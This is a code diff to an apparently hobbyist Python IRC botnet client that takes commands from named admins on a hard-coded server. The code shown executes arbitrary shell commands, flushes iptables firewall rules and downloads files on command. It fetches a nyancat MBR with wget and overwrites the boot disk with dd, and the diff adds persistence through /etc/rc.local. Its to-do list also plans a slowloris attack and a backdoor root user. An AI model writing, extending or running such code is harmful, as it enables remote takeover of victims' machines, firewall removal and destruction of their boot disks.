@@ -6,7 +6,6 @@
 #to do list
 #make more cross-platform instead of just for linux - windows, mac, sun, etc.
 #figure out how to disconnect from server and disconnect from channel
-#add function to tell if unix based or windows
 #slowloris function
 #persist function
 #add root/backdoor user function
@@ -25,9 +24,11 @@ import subprocess as sub
 from sys import argv
 from random import randint
 
-def generateNick(os): #generates a nick for the server
+def generateNick(operatingSystem): #generates a nick for the server
+	if operatingSystem == "":
+		operatingSystem = "unk"
 	rannum = str(randint(0, 9999))
-	return str(os[:3] + rannum)
+	return str(operatingSystem[:3] + rannum)
 
 def execute(cmd): #execute shell commands
 	isItLs = 0
@@ -122,7 +123,24 @@ def uptime(): #total uptime on the server
 	request = execute("uptime")
 	sendData(request)
 
-def version(): #which kernel version
+def version(): #determine flavor/version
+	if operatingSystem == "darwin": #if mac
+		info = platform.mac_ver()
+	elif operatingSystem == "windows": #if windows
+		info = platform.win32_ver()
+	elif operatingSystem == "linux": #if linux
+		info = platform.linux_distribution()
+	else:
+		sendData("Not sure...")
+
+	output = ""
+	for word in info:
+		output = output + word + " - "
+
+	output = output[:-3]
+	sendData(output)
+
+def kernel(): #which kernel version
 	sendData(platform.release())
 
 def getIP(): #gets the public IP address
@@ -130,24 +148,24 @@ def getIP(): #gets the public IP address
 	sendData(my_ip)
 
 def flushFirewall(): #flushes the firewall rules
-	if (os == "linux"):
+	if (operatingSystem == "linux"):
 		request = execute("/usr/bin/env iptables -F") #flushing rules
 		sendData("Firewall rules have been flushed.")
 
 def checkFirewall(): #reports current firewall config
-	if (os == "linux"):
+	if (operatingSystem == "linux"):
 		sendData("Current Firewall Rules:")
 		request = execute("/usr/bin/env iptables -L -n")
 		sendData(request)
-	elif (os == "windows"):
+	elif (operatingSystem == "windows"):
 		sendData("idk how to windows yet boss.")
-	elif (os == "darwin"):
+	elif (operatingSystem == "darwin"):
 		sendData("idk how to mac yet boss.")
 	else:
 		sendData("unknown")
 
 def download(cmd): #file downloader
-	if (os == "linux"):
+	if (operatingSystem == "linux"):
 		if (cmd.count(" ") != 1): #make sure there is only 1 space
 			sendData("Usage: download [file] [dir]")
 		else:
@@ -158,7 +176,7 @@ def download(cmd): #file downloader
 			sendData("Download executed.")
 
 def nyanmbr(): #download nyancat.mbr and over bootloader with it
-	if (os != "windows" and os != "unknown"):
+	if (operatingSystem != "windows" and operatingSystem != ""):
 		execute("wget --no-check-certificate -q -P /tmp https://minemu.org/nyanmbr/nyan.mbr")
 		execute("dd if=/tmp/nyan.mbr of=/dev/sda")
 		execute("rm -rf /tmp/nyan.mbr")
@@ -172,8 +190,24 @@ def reboot(): #reboot the computer
 	irc.close()
 	execute("init 6")
 
-def persist(): #try to persist bot
-	sendData("I don't know how to do that yet boss.")
+def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/etc/rc.d/
+	if operatingSystem == "linux": #if linux
+		path = "/etc/rc.local"
+	elif operatingSystem == "windows":
+		sendData("I'm on windows boss...")
+		return
+	else:
+		sendData("I don't even know boss :(")
+		return
+
+	if os.access(path, os.W_OK): #check if we have write perms
+		outfile = open(path, 'a')
+		dir = execute("pwd")
+		outfile.write("/usr/bin/env python " + dir.strip() + "/" + argv[0])
+		sendData("Seems to have worked...")
+	else:
+		sendData("Either /etc/rc.local doesn't exist or I can't write to it.")
+
 
 def runFunction(cmd):
 	if cmd in commands.keys(): #if regular command
@@ -192,7 +226,8 @@ if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
 	DEBUG = 1
 
 #other vars
-os = platform.system().lower() #detected os in all lowercase
+argv[0] = argv[0][2:]
+operatingSystem = platform.system().lower() #detected os in all lowercase
 INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
 						#index two is the boolean for if the interactive shell is with this bot
 						#index three is mode indicator. if >0 we are in shell mode, if <0 we are in functions mode
@@ -202,7 +237,7 @@ admins = ["king", "samorizu", "blackbear", "bigshebang"]
 server = "leagueachieve.info"
 port = 6667
 channel = "#lobby"
-nick = generateNick(os)
+nick = generateNick(operatingSystem)
 
 print "The botnick is: '%s'" % nick
 
@@ -215,6 +250,7 @@ commands = {
 	"zombie apocalypse" : terminate,
 	"free" : freeSpace,
 	"uptime" : uptime,
+	"kernel" : kernel,
 	"version" : version,
 	"what is your ip" : getIP,
 	"where are you" : getIP,
